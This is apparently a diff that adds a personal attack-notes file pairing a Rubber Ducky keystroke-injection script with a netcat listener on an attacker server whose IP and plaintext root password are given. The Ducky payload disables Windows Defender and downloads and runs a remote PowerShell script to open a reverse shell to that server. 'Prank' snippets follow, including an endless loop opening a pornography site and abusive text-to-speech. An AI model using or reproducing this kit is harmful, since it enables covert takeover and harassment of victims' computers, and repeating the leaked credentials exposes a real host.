@@ -1,0 +1,67 @@
+Hacker Machine:
+
+ssh root@139.162.246.113
+Pass: Casper415415
+
+stty raw -echo; (stty size; cat) | nc -lvnp 87 -s 139.162.246.113
+
+
+Target Machine:
+
+Rubber ducky inject.bin:
+
+REM Turn off Windows Defender and start reverse shell
+REM
+DELAY 1000
+GUI r
+DELAY 200
+REM Start an elevated powershell instance which will disable Windows Defender.
+STRING powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
+ENTER
+DELAY 1000
+REM if you need administrator [left, enter and delay 1000]
+LEFT
+ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell -w hidden "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 139.162.246.113 87"
+ENTER
+STRING exit
+ENTER
+
+Pranks:
+
+Speaking;
+
+$WScript = New-Object -com wscript.shell; 1..50 | % { $WScript.SendKeys([char]175) }; 
+Function Speak-Text($Text) { Add-Type -AssemblyName System.speech; $TTS = New-Object System.Speech.Synthesis.SpeechSynthesizer; $TTS.Speak($Text) }
+Speak-Text "You're an idiot! Go eat some poop mother fucker."
+
+Open rick roll;
+
+start chrome https://www.youtube.com/watch?v=xvFZjo5PgG0
+$WScript = New-Object -com wscript.shell; 1..50 | % { $WScript.SendKeys([char]175) }; 
+
+Fake update screen;
+
+Start-Process iexplore -ArgumentList "-k http://fakeupdate.net/win10ue/"
+
+Pornhub prank;
+
+while(1) { Start-Process 'http://www.pornhub.com/' }
+
+Malware prank;
+
+Start-Process iexplore -ArgumentList "-k http://fakeupdate.net/wnc/"
+
+Taskkill;
+
+taskkill /IM "chrome.exe" /F
+
+Links:
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell
+
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 139.162.246.113 87
